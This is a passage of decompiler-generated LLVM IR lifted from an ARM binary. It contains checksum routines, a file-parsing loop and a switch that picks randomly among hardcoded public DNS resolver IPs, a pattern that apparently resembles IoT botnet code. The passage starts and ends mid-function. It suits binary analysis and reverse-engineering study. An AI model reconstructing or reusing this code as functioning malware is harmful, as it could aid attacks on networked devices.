  store i16 %v1_d9e8, i16* %v5_d9f4, align 2
  br i1 %v9_d9f0, label %dec_label_pc_d9fc, label %dec_label_pc_d9e8.dec_label_pc_d914_crit_edge

dec_label_pc_d9e8.dec_label_pc_d914_crit_edge:    ; preds = %dec_label_pc_d9e8
  %v1_d918.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d914

dec_label_pc_d9fc:                                ; preds = %dec_label_pc_d9e8, %dec_label_pc_d908
  %v0_d9fc = call i32 @function_f570()
  %v1_d9fc = trunc i32 %v0_d9fc to i16
  store i32 %v0_d9fc, i32* %r0.global-to-local, align 4
  store i32 %v3_d6fc, i32* @r3, align 4
  %v1_da04 = load i32, i32* @r5, align 4
  %v9_da04 = icmp eq i32 %v3_d6fc, %v1_da04
  store i1 %v9_da04, i1* %cpsr_z.global-to-local, align 1
  %v3_da08 = load i32, i32* @r4, align 4
  %v4_da08 = add i32 %v3_da08, 20
  %v5_da08 = inttoptr i32 %v4_da08 to i16*
  store i16 %v1_d9fc, i16* %v5_da08, align 2
  br i1 %v9_da04, label %dec_label_pc_da10, label %dec_label_pc_d9fc.dec_label_pc_d920_crit_edge

dec_label_pc_d9fc.dec_label_pc_d920_crit_edge:    ; preds = %dec_label_pc_d9fc
  %v1_d924.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d920

dec_label_pc_da10:                                ; preds = %dec_label_pc_d9fc, %dec_label_pc_d914
  %v0_da10 = call i32 @function_f570()
  %v1_da10 = trunc i32 %v0_da10 to i16
  store i32 %v0_da10, i32* %r0.global-to-local, align 4
  store i32 %v3_d700, i32* %r1.global-to-local, align 4
  %v1_da18 = load i32, i32* @r5, align 4
  %v9_da18 = icmp eq i32 %v3_d700, %v1_da18
  store i1 %v9_da18, i1* %cpsr_z.global-to-local, align 1
  %v3_da1c = load i32, i32* @r6, align 4
  %v4_da1c = add i32 %v3_da1c, 2
  %v5_da1c = inttoptr i32 %v4_da1c to i16*
  store i16 %v1_da10, i16* %v5_da1c, align 2
  br i1 %v9_da18, label %dec_label_pc_da24, label %dec_label_pc_d92c

dec_label_pc_da24:                                ; preds = %dec_label_pc_da10, %dec_label_pc_d920
  %v0_da24 = call i32 @function_f570()
  %v1_da24 = trunc i32 %v0_da24 to i16
  store i32 %v0_da24, i32* %r0.global-to-local, align 4
  %v3_da28 = load i32, i32* @r4, align 4
  %v4_da28 = add i32 %v3_da28, 28
  %v5_da28 = inttoptr i32 %v4_da28 to i16*
  store i16 %v1_da24, i16* %v5_da28, align 2
  br label %dec_label_pc_d92c

dec_label_pc_da30:                                ; preds = %dec_label_pc_d600, %dec_label_pc_d5e0, %dec_label_pc_d584, %dec_label_pc_d430
  %v0_da30 = call i32 @function_f570()
  %v1_da34 = urem i32 %v0_da30, 4
  store i32 %v1_da34, i32* %r0.global-to-local, align 4
  %v2_da38 = icmp eq i32 %v1_da34, 3
  store i1 %v2_da38, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_da30 to i2
  switch i2 %trunc, label %dec_label_pc_d67c3 [
    i2 0, label %dec_label_pc_dabc
    i2 1, label %dec_label_pc_daac
    i2 -2, label %dec_label_pc_da94
    i2 -1, label %dec_label_pc_da7c
  ]

dec_label_pc_da54:                                ; preds = %dec_label_pc_d748
  store i32 16384, i32* %r0.global-to-local, align 4
  %v1_da58 = call i32 @function_1484c(i32 16384)
  %v2_da58 = trunc i32 %v1_da58 to i16
  store i32 %v1_da58, i32* %r0.global-to-local, align 4
  %v3_da5c = load i32, i32* %r5.global-to-local, align 4
  %v4_da5c = add i32 %v3_da5c, 6
  %v5_da5c = inttoptr i32 %v4_da5c to i16*
  store i16 %v2_da58, i16* %v5_da5c, align 2
  %v2_d7c8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_d7c4

dec_label_pc_da64:                                ; preds = %dec_label_pc_d6b0
  store i32 %v3_d6a0, i32* @r0, align 4
  %v1_da68 = call i32 @function_15b20(i32 %v3_d6a0)
  store i32 %v1_da68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_da6c

dec_label_pc_da6c:                                ; preds = %dec_label_pc_d688, %dec_label_pc_d67c, %dec_label_pc_da64
  %v1_da78 = phi i32 [ %v3_d6a0, %dec_label_pc_d688 ], [ %stack_var_-2172.0, %dec_label_pc_d67c ], [ %v1_da68, %dec_label_pc_da64 ]
  store i32 %v3_d430, i32* %r4.global-to-local, align 4
  store i32 %v6_d430, i32* %r5.global-to-local, align 4
  store i32 %v9_d430, i32* %r6.global-to-local, align 4
  ret i32 %v1_da78

dec_label_pc_da7c:                                ; preds = %dec_label_pc_da30
  store i32 67240450, i32* %r0.global-to-local, align 4
  %v1_da88 = call i32 @function_14828(i32 67240450)
  store i32 %v1_da88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_da94:                                ; preds = %dec_label_pc_da30
  store i32 1074151430, i32* %r0.global-to-local, align 4
  %v1_daa0 = call i32 @function_14828(i32 1074151430)
  store i32 %v1_daa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_daac:                                ; preds = %dec_label_pc_da30
  store i32 1246898730, i32* %r0.global-to-local, align 4
  %v1_dab0 = call i32 @function_14828(i32 1246898730)
  store i32 %v1_dab0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

dec_label_pc_dabc:                                ; preds = %dec_label_pc_da30
  store i32 134744072, i32* %r0.global-to-local, align 4
  %v1_dac8 = call i32 @function_14828(i32 134744072)
  store i32 %v1_dac8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d67c

; uselistorder directives
  uselistorder i32 %v1_dac8, { 1, 0 }
  uselistorder i32 %v1_dab0, { 1, 0 }
  uselistorder i32 %v1_daa0, { 1, 0 }
  uselistorder i32 %v1_da88, { 1, 0 }
  uselistorder i32 %v1_da58, { 1, 0 }
  uselistorder i32 %v1_da34, { 1, 0 }
  uselistorder i32 %v0_da30, { 1, 0 }
  uselistorder i32 %v0_da24, { 1, 0 }
  uselistorder i32 %v0_da10, { 1, 0 }
  uselistorder i32 %v0_d9fc, { 1, 0 }
  uselistorder i32 %v0_d9e8, { 1, 0 }
  uselistorder i32 %v1_d9bc, { 1, 2, 0 }
  uselistorder i32 %v1_d9b8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_d968, { 1, 0 }
  uselistorder i32 %v2_d948, { 1, 0 }
  uselistorder i1 %v3_d90c, { 1, 0 }
  uselistorder i1 %v3_d8f4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_d8a8, { 1, 0 }
  uselistorder i32 %v0_d888, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_d874, { 2, 0, 3, 1 }
  uselistorder i32 %v0_d870, { 1, 0, 2 }
  uselistorder i32 %v1_d7a0, { 1, 0 }
  uselistorder i32 %v1_d734, { 1, 0, 2 }
  uselistorder i32 %v3_d728, { 1, 0 }
  uselistorder i32 %v0_d724, { 1, 0 }
  uselistorder i32 %v1_d718, { 1, 2, 0 }
  uselistorder i32 %v3_d6f8, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 %v3_d6f4, { 1, 0, 5, 2, 3, 4 }
  uselistorder i1 %v7_d6d0, { 1, 0 }
  uselistorder i1 %v7_d6a4, { 1, 0 }
  uselistorder i32 %v3_d6a0, { 1, 3, 4, 5, 2, 0, 6 }
  uselistorder i32 %stack_var_-2172.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_d64c, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_d648, { 1, 0, 2 }
  uselistorder i1 %v7_d634, { 1, 0 }
  uselistorder i32 %v1_d630, { 1, 0, 2 }
  uselistorder i1 %v8_d628, { 1, 0 }
  uselistorder i1 %v7_d624, { 1, 0 }
  uselistorder i32 %v1_d618, { 1, 0 }
  uselistorder i8 %v2_d60c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_d610, { 1, 0 }
  uselistorder i32 %v0_d630, { 3, 0, 2, 1 }
  uselistorder i32 %v0_d600, { 0, 1, 3, 2 }
  uselistorder i32 %v1_d614, { 0, 2, 1 }
  uselistorder i32 %v2_d5e8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d5e0, { 1, 0, 2, 3 }
  uselistorder i1 %v7_d5d8, { 1, 0 }
  uselistorder i32 %v0_d5d8, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 %v2_d588, { 0, 2, 1, 3 }
  uselistorder i32 %v0_d57c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_d54c, { 0, 1, 3, 2, 6, 7, 5, 4 }
  uselistorder i32 %v1_d4d0, { 1, 2, 0 }
  uselistorder i8 %v5_d488, { 1, 0 }
  uselistorder i32 %v6_d468, { 1, 0 }
  uselistorder i32 %v2_d450, { 0, 4, 5, 2, 1, 3 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8 }
  uselistorder i32* %r5.global-to-local, { 0, 16, 3, 1, 2, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 32, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 30, 31, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 40, 9, 41, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 37, 36, 39, 38, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 6, 5, 8, 7, 9, 12, 10, 11, 13, 14, 15, 17, 16, 19, 18, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 40, 39, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 52, 51, 53, 54, 55, 56, 58, 57, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 24, 26, 27, 28, 25, 22, 29, 30, 31 }
  uselistorder i32 41, { 4, 5, 6, 0, 2, 7, 1, 8, 3, 9 }
  uselistorder i32 (i32)* @function_14860, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_da6c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d92c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d890, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %dec_label_pc_d7c4, { 1, 0 }
  uselistorder label %dec_label_pc_d644, { 1, 0 }
  uselistorder label %dec_label_pc_d634, { 1, 0 }
  uselistorder label %dec_label_pc_d600, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d5f8, { 1, 0 }
}

define i32 @function_dadc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_dadc:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_db00, label %dec_label_pc_dae8

dec_label_pc_dae8:                                ; preds = %dec_label_pc_dadc
  %v0_daf0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_daec

dec_label_pc_daec:                                ; preds = %dec_label_pc_daec, %dec_label_pc_dae8
  %v0_daf8 = phi i32 [ %v2_daf8, %dec_label_pc_daec ], [ 0, %dec_label_pc_dae8 ]
  %v0_daf0 = phi i32 [ %v5_daf0, %dec_label_pc_daec ], [ %v0_daf0.pre, %dec_label_pc_dae8 ]
  %v0_daec = phi i32 [ %v1_daec, %dec_label_pc_daec ], [ %arg1, %dec_label_pc_dae8 ]
  %v1_daec = add i32 %v0_daec, -2
  %v1_daf0 = inttoptr i32 %v0_daf0 to i16*
  %v2_daf0 = load i16, i16* %v1_daf0, align 2
  %v3_daf0 = zext i16 %v2_daf0 to i32
  %v5_daf0 = add i32 %v0_daf0, -2
  store i32 %v5_daf0, i32* @r0, align 4
  %v2_daf8 = add i32 %v3_daf0, %v0_daf8
  %v1_daec.cmp = icmp ugt i32 %v1_daec, 1
  br i1 %v1_daec.cmp, label %dec_label_pc_daec, label %dec_label_pc_db00.loopexit

dec_label_pc_db00.loopexit:                       ; preds = %dec_label_pc_daec
  br label %dec_label_pc_db00

dec_label_pc_db00:                                ; preds = %dec_label_pc_dadc, %dec_label_pc_db00.loopexit
  %v1_db08 = phi i32 [ %v2_daf8, %dec_label_pc_db00.loopexit ], [ 0, %dec_label_pc_dadc ]
  %v0_db00 = phi i32 [ %v1_daec, %dec_label_pc_db00.loopexit ], [ %arg1, %dec_label_pc_dadc ]
  %v7_db00 = icmp eq i32 %v0_db00, 1
  br i1 %v7_db00, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_db00
  %v1_db04 = load i32, i32* @r0, align 4
  %v2_db04 = inttoptr i32 %v1_db04 to i8*
  %v3_db04 = load i8, i8* %v2_db04, align 1
  %v4_db04 = zext i8 %v3_db04 to i32
  %v3_db08 = add i32 %v1_db08, %v4_db04
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_db00, %bb
  %v0_db0c = phi i32 [ %v1_db08, %dec_label_pc_db00 ], [ %v3_db08, %bb ]
  %v3_db10 = urem i32 %v0_db0c, 65536
  %v4_db14 = udiv i32 %v0_db0c, 65536
  %v5_db14 = add nuw nsw i32 %v4_db14, %v3_db10
  %v4_db18 = udiv i32 %v5_db14, 65536
  %v5_db18 = add nuw nsw i32 %v4_db18, %v5_db14
  %v1_db1c = urem i32 %v5_db18, 65536
  %v3_db24 = xor i32 %v1_db1c, 65535
  ret i32 %v3_db24

; uselistorder directives
  uselistorder i32 %v5_db14, { 1, 0 }
  uselistorder i32 %v5_daf0, { 1, 0 }
  uselistorder i32 %v1_daec, { 1, 0, 2 }
  uselistorder i32 %v0_daf0, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_db00, { 1, 0 }
}

define i32 @function_db2c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_db2c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v0_db30 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v1_db40 = add i32 %arg1, 12
  %v2_db40 = inttoptr i32 %v1_db40 to i32*
  %v3_db40 = load i32, i32* %v2_db40, align 4
  store i32 %v3_db40, i32* %r6.global-to-local, align 4
  %v1_db44 = add i32 %arg1, 16
  %v2_db44 = inttoptr i32 %v1_db44 to i32*
  %v3_db44 = load i32, i32* %v2_db44, align 4
  store i32 %v3_db44, i32* %r5.global-to-local, align 4
  %v7_db48 = icmp sgt i32 %v0_db30, 1
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v7_db48, label %dec_label_pc_db54.preheader, label %dec_label_pc_db68

dec_label_pc_db54.preheader:                      ; preds = %dec_label_pc_db2c
  %v0_db58.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_db54

dec_label_pc_db54:                                ; preds = %dec_label_pc_db54.preheader, %dec_label_pc_db54
  %v0_db60 = phi i32 [ 0, %dec_label_pc_db54.preheader ], [ %v2_db60, %dec_label_pc_db54 ]
  %v0_db58 = phi i32 [ %v0_db58.pre, %dec_label_pc_db54.preheader ], [ %v5_db58, %dec_label_pc_db54 ]
  %v0_db54 = phi i32 [ %v0_db30, %dec_label_pc_db54.preheader ], [ %v1_db54, %dec_label_pc_db54 ]
  %v1_db54 = add nsw i32 %v0_db54, -2
  %v1_db58 = inttoptr i32 %v0_db58 to i16*
  %v2_db58 = load i16, i16* %v1_db58, align 2
  %v3_db58 = zext i16 %v2_db58 to i32
  store i32 %v3_db58, i32* %r3.global-to-local, align 4
  %v5_db58 = add i32 %v0_db58, -2
  store i32 %v5_db58, i32* @r1, align 4
  %v2_db60 = add i32 %v3_db58, %v0_db60
  store i32 %v2_db60, i32* %r4.global-to-local, align 4
  %v8_db64 = icmp sgt i32 %v1_db54, 1
  br i1 %v8_db64, label %dec_label_pc_db54, label %dec_label_pc_db68.loopexit

dec_label_pc_db68.loopexit:                       ; preds = %dec_label_pc_db54
  br label %dec_label_pc_db68

dec_label_pc_db68:                                ; preds = %dec_label_pc_db68.loopexit, %dec_label_pc_db2c
  %v1_db74 = phi i32 [ %v2_db60, %dec_label_pc_db68.loopexit ], [ 0, %dec_label_pc_db2c ]
  %v0_db68 = phi i32 [ %v1_db54, %dec_label_pc_db68.loopexit ], [ %v0_db30, %dec_label_pc_db2c ]
  %v7_db68 = icmp eq i32 %v0_db68, 1
  br i1 %v7_db68, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_db68
  %v1_db701 = add i32 %arg1, 9
  %v2_db702 = inttoptr i32 %v1_db701 to i8*
  %v3_db703 = load i8, i8* %v2_db702, align 1
  br label %bb20

bb:                                               ; preds = %dec_label_pc_db68
  %v1_db6c = load i32, i32* @r1, align 4
  %v2_db6c = inttoptr i32 %v1_db6c to i8*
  %v3_db6c = load i8, i8* %v2_db6c, align 1
  %v4_db6c = zext i8 %v3_db6c to i32
  store i32 %v4_db6c, i32* %r3.global-to-local, align 4
  %v1_db70 = add i32 %arg1, 9
  %v2_db70 = inttoptr i32 %v1_db70 to i8*
  %v3_db70 = load i8, i8* %v2_db70, align 1
  %v3_db74 = add i32 %v4_db6c, %v1_db74
  store i32 %v3_db74, i32* %r4.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %.thread, %bb
  %v4_db705.in = phi i8 [ %v3_db703, %.thread ], [ %v3_db70, %bb ]
  %v4_db705 = zext i8 %v4_db705.in to i32
  %v1_db78 = call i32 @function_1484c(i32 %v4_db705)
  %v0_db7c = load i32, i32* %r5.global-to-local, align 4
  %v0_db80 = load i32, i32* %r6.global-to-local, align 4
  %v3_db84 = urem i32 %v0_db80, 65536
  %v3_db88 = urem i32 %v0_db7c, 65536
  %v4_db90 = udiv i32 %v0_db80, 65536
  %v4_db94 = udiv i32 %v0_db7c, 65536
  %v1_db98 = load i32, i32* %r7.global-to-local, align 4
  %v1_db9c = load i32, i32* %r4.global-to-local, align 4
  %v2_db8c = add nuw nsw i32 %v4_db94, %v3_db88
  %v5_db90 = add nuw nsw i32 %v2_db8c, %v3_db84
  %v5_db94 = add nuw nsw i32 %v5_db90, %v4_db90
  %v2_db98 = add i32 %v5_db94, %v1_db98
  %v2_db9c = add i32 %v2_db98, %v1_db9c
  store i32 %v2_db9c, i32* %r3.global-to-local, align 4
  %v2_dba0 = add i32 %v2_db9c, %v1_db78
  %tmp = icmp ult i32 %v2_dba0, 65536
  br i1 %tmp, label %dec_label_pc_dbc0, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %bb20, %dec_label_pc_dbac
  %v2_dbb46 = phi i32 [ %v2_dbb4, %dec_label_pc_dbac ], [ %v2_dba0, %bb20 ]
  %v3_dbb87.in = phi i32 [ %v2_dbb4, %dec_label_pc_dbac ], [ %v2_dba0, %bb20 ]
  %v3_dbb87 = udiv i32 %v3_dbb87.in, 65536
  %v3_dbb0 = urem i32 %v2_dbb46, 65536
  %v2_dbb4 = add nuw nsw i32 %v3_dbb0, %v3_dbb87
  %tmp21 = icmp ult i32 %v2_dbb4, 65536
  br i1 %tmp21, label %dec_label_pc_dbc0.loopexit, label %dec_label_pc_dbac

dec_label_pc_dbc0.loopexit:                       ; preds = %dec_label_pc_dbac
  store i32 %v3_dbb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_dbc0.loopexit, %bb20
  %v0_dbc0 = phi i32 [ %v2_dbb4, %dec_label_pc_dbc0.loopexit ], [ %v2_dba0, %bb20 ]
  %v1_dbc0 = urem i32 %v0_dbc0, 65536
  %v3_dbc8 = xor i32 %v1_dbc0, 65535
  ret i32 %v3_dbc8

; uselistorder directives
  uselistorder i32 %v2_dbb4, { 2, 1, 3, 0 }
  uselistorder i32 %v3_dbb0, { 1, 0 }
  uselistorder i32 %v2_dba0, { 3, 0, 2, 1 }
  uselistorder i32 %v2_db60, { 0, 2, 1 }
  uselistorder i32 %v5_db58, { 1, 0 }
  uselistorder i32 %v0_db58, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_dbac, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_db54, { 1, 0 }
}

define i32 @function_dbd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_dbd8:
  store i32 %arg1, i32* @r2, align 4
  %v2_dbe4 = load i32, i32* @global_var_22914.101, align 4
  store i32 %v2_dbe4, i32* @r0, align 4
  %v2_dbec = call i32 @function_14dd8(i32 %v2_dbe4, i32 9)
  ret i32 %v2_dbec
}

define i32 @function_dc00(i32 %arg1) local_unnamed_addr {
dec_label_pc_dc00:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i8, align 1
  %stack_var_-585 = alloca i8, align 1
  %stack_var_-8777 = alloca i32, align 4
  %stack_var_-4681 = alloca i32, align 4
  %v3_dc00 = load i32, i32* @r4, align 4
  %v6_dc00 = load i32, i32* @r5, align 4
  %v9_dc00 = load i32, i32* @r6, align 4
  %v12_dc00 = load i32, i32* @r7, align 4
  %v15_dc00 = load i32, i32* @r8, align 4
  %v18_dc00 = load i32, i32* @sb, align 4
  %v21_dc00 = load i32, i32* @sl, align 4
  %v24_dc00 = load i32, i32* @fp, align 4
  %v27_dc00 = load i32, i32* @lr, align 4
  %v2_dc14 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_dc14, i32* @sl, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_dc28 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_dc28, i32* @fp, align 4
  %v3_dc34 = bitcast i32* %stack_var_-4681 to i8*
  %v4_dc34 = call i32 @function_15548(i8* %v3_dc34, i32 0, i32 4096)
  %v3_dc48 = bitcast i32* %stack_var_-8777 to i8*
  %v4_dc48 = call i32 @function_15548(i8* %v3_dc48, i32 0, i32 4096)
  %v2_dc4c = ptrtoint i8* %stack_var_-585 to i32
  store i32 %v2_dc4c, i32* @r6, align 4
  %v4_dc60 = call i32 @function_15548(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v0_dc6c = load i32, i32* @r4, align 4
  store i32 0, i32* @r4, align 4
  %v2_dc74 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_dc74, i32* @sb, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v1_dc88 = call i32 @function_149f4(i32 %v0_dc6c)
  %v3_dc94 = trunc i32 %v1_dc88 to i8
  %v4_dc94 = call i32 @function_12824(i8 %v3_dc94, i32 16, i32 %v2_dc74)
  %v2_dc9c = call i32 @function_12324(i8* nonnull %stack_var_-72)
  %v7_dca0 = icmp eq i32 %v2_dc9c, 2
  br i1 %v7_dca0, label %dec_label_pc_e130, label %dec_label_pc_dca8

dec_label_pc_dca8:                                ; preds = %dec_label_pc_dc00, %dec_label_pc_e130
  %v1_dcac = call i32 @function_11a94(i32 6)
  %v1_dcb4 = call i32 @function_11a94(i32 7)
  %v1_dcbc = call i32 @function_11a94(i32 9)
  %v0_dcc4 = load i32, i32* @r4, align 4
  %v3_dcc8 = call i32 @function_130e0(i32 ptrtoint ([14 x i8]* @global_var_197c4.103 to i32), i32 %v0_dcc4)
  %v7_dccc = icmp eq i32 %v3_dcc8, -1
  store i32 %v3_dcc8, i32* @r8, align 4
  br i1 %v7_dccc, label %dec_label_pc_e0f0, label %dec_label_pc_dcd8.preheader

dec_label_pc_dcd8.preheader:                      ; preds = %dec_label_pc_dca8
  %v4_dce454 = call i32 @function_12584(i8* nonnull %stack_var_-585, i32 512, i32 %v3_dcc8)
  %v2_dce856 = icmp eq i32 %v4_dce454, 0
  br i1 %v2_dce856, label %dec_label_pc_de70.loopexit, label %dec_label_pc_dcf0.lr.ph

dec_label_pc_dcf0.lr.ph:                          ; preds = %dec_label_pc_dcd8.preheader
  %v2_dd38 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_dcf0

dec_label_pc_dcf0:                                ; preds = %dec_label_pc_dcf0.lr.ph, %dec_label_pc_dcd8.backedge
  %v3_dcf4 = load i8, i8* %stack_var_-585, align 1
  %v4_dcf4 = sext i8 %v3_dcf4 to i32
  %v2_dcf8 = icmp eq i8 %v3_dcf4, 0
  br i1 %v2_dcf8, label %bb128, label %bb

bb:                                               ; preds = %dec_label_pc_dcf0
  %v8_dcfc = icmp eq i8 %v3_dcf4, 58
  br i1 %v8_dcfc, label %.thread6, label %dec_label_pc_dd10

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_dd28

bb128:                                            ; preds = %dec_label_pc_dcf0
  br label %dec_label_pc_dd28

dec_label_pc_dd10:                                ; preds = %bb
  %v1_dd18.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_dd14

dec_label_pc_dd14:                                ; preds = %bb129, %dec_label_pc_dd10
  %v0_dd14 = phi i32 [ %v1_dd14, %bb129 ], [ 0, %dec_label_pc_dd10 ]
  %v1_dd14 = add i32 %v0_dd14, 1
  %v2_dd18 = add i32 %v1_dd14, %v1_dd18.pre
  %v3_dd18 = inttoptr i32 %v2_dd18 to i8*
  %v4_dd18 = load i8, i8* %v3_dd18, align 1
  %v6_dd18 = zext i8 %v4_dd18 to i32
  %v2_dd1c = icmp eq i8 %v4_dd18, 0
  br i1 %v2_dd1c, label %dec_label_pc_dd28, label %bb129

bb129:                                            ; preds = %dec_label_pc_dd14
  %v8_dd20 = icmp eq i8 %v4_dd18, 58
  br i1 %v8_dd20, label %dec_label_pc_dd28, label %dec_label_pc_dd14

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dd14, %bb129, %bb128, %.thread6
  %v1_dd54 = phi i32 [ 0, %.thread6 ], [ 0, %bb128 ], [ %v1_dd14, %bb129 ], [ %v1_dd14, %dec_label_pc_dd14 ]
  %v0_dd28 = phi i32 [ %v4_dcf4, %.thread6 ], [ %v4_dcf4, %bb128 ], [ %v6_dd18, %bb129 ], [ %v6_dd18, %dec_label_pc_dd14 ]
  %v2_dd28 = icmp eq i32 %v0_dd28, 0
  br i1 %v2_dd28, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_dd30

dec_label_pc_dcd8.backedge:                       ; preds = %dec_label_pc_dd28, %dec_label_pc_ddf8, %dec_label_pc_de38, %dec_label_pc_dd74
  %v0_dce0 = load i32, i32* @r8, align 4
  %v4_dce4 = call i32 @function_12584(i8* nonnull %stack_var_-585, i32 512, i32 %v0_dce0)
  %v2_dce8 = icmp eq i32 %v4_dce4, 0
  br i1 %v2_dce8, label %dec_label_pc_de70.loopexit, label %dec_label_pc_dcf0

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dd28
  %v1_dd34 = add i32 %v1_dd54, 2
  %v2_dd3c = add i32 %v1_dd34, %v2_dd38
  %v1_dd40 = add i32 %v2_dd3c, -545
  %v2_dd40 = inttoptr i32 %v1_dd40 to i8*
  %v3_dd40 = load i8, i8* %v2_dd40, align 1
  %v2_dd44 = icmp eq i8 %v3_dd40, 0
  br i1 %v2_dd44, label %bb131, label %bb130

bb130:                                            ; preds = %dec_label_pc_dd30
  %v8_dd48 = icmp eq i8 %v3_dd40, 32
  br i1 %v8_dd48, label %.thread10, label %dec_label_pc_dd54

.thread10:                                        ; preds = %bb130
  store i32 %v1_dd34, i32* @r5, align 4
  br label %dec_label_pc_dd74

bb131:                                            ; preds = %dec_label_pc_dd30
  store i32 %v1_dd34, i32* @r5, align 4
  br label %dec_label_pc_dd74

dec_label_pc_dd54:                                ; preds = %bb130
  %v0_dd54 = load i32, i32* @r6, align 4
  %v2_dd54 = add i32 %v0_dd54, %v1_dd54
  br label %dec_label_pc_dd5c

dec_label_pc_dd5c:                                ; preds = %bb132, %dec_label_pc_dd54
  %v0_dd6813 = phi i32 [ %v1_dd68, %bb132 ], [ %v1_dd34, %dec_label_pc_dd54 ]
  %v0_dd6c15 = phi i32 [ %v1_dd6c, %bb132 ], [ %v2_dd54, %dec_label_pc_dd54 ]
  %v1_dd5c = add i32 %v0_dd6c15, 3
  %v2_dd5c = inttoptr i32 %v1_dd5c to i8*
  %v3_dd5c = load i8, i8* %v2_dd5c, align 1
  %v2_dd60 = icmp eq i8 %v3_dd5c, 0
  br i1 %v2_dd60, label %.thread12, label %bb132

.thread12:                                        ; preds = %dec_label_pc_dd5c
  %v1_dd6814 = add i32 %v0_dd6813, 1
  store i32 %v1_dd6814, i32* @r5, align 4
  br label %dec_label_pc_dd74

